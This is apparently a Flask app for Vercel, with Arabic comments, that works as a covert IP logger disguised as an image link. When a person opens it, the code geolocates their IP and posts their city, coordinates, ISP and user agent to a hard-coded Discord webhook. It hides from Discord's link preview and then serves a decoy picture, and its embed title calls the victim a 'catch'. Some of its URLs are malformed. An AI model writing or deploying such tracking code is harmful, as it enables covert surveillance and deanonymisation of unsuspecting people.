from flask import Flask, request, send_file
import requests
import io

# يجب أن يكون اسم المتغير 'app' ليتعرف عليه Vercel تلقائياً
app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1493558963869061224/tY_NAc83SlbAMed-ibT8MdFhC88Owdqb-naTrn6q5-En386EXCCqZBByyhiPg6S7JBOr"
IMAGE_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRvw7uLGr6ScxbGYJhGNqEjXnW-e6nJaE5c0w&s"

@app.route('/api/image')
def logger():
    ua = request.headers.get('User-Agent', '')
    # الحصول على الـ IP الحقيقي عبر بروكسي Vercel
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]

    # 1. منع ديسكورد من المعاينة (تظهر كصورة مكسورة حتى يفتحها في المتصفح)
    if "discord" in ua.lower() or "bot" in ua.lower():
        return "Not Found", 404

    # 2. جلب معلومات تفصيلية جداً
    try:
        data = requests.get(f"http://ip-api.com{ip}?fields=16976857").json()
        
        embed = {
            "title": "🚨 صيد جديد - معلومات كاملة!",
            "color": 0xFF0000,
            "fields": [
                {"name": "📍 الموقع", "value": f"{data.get('city')}, {data.get('regionName')}, {data.get('country')}", "inline": True},
                {"name": "🌐 الإحداثيات", "value": f"{data.get('lat')}, {data.get('lon')}", "inline": True},
                {"name": "🏢 ISP", "value": data.get('isp'), "inline": False},
                {"name": "⚙️ نظام التشغيل/المتصفح", "value": f"```\n{ua}\n```", "inline": False},
                {"name": "🗺️ خريطة جوجل", "value": f"[اضغط هنا للفتح](https://google.com{data.get('lat')},{data.get('lon')})"}
            ],
            "footer": {"text": f"IP: {ip}"}
        }
        requests.post(WEBHOOK_URL, json={"embeds": [embed]})
    except:
        pass

    # إرسال الصورة للمتصفح
    img_res = requests.get(IMAGE_URL)
    return send_file(io.BytesIO(img_res.content), mimetype='image/png')

# ضروري لـ Vercel
if __name__ == "__main__":
    app.run()
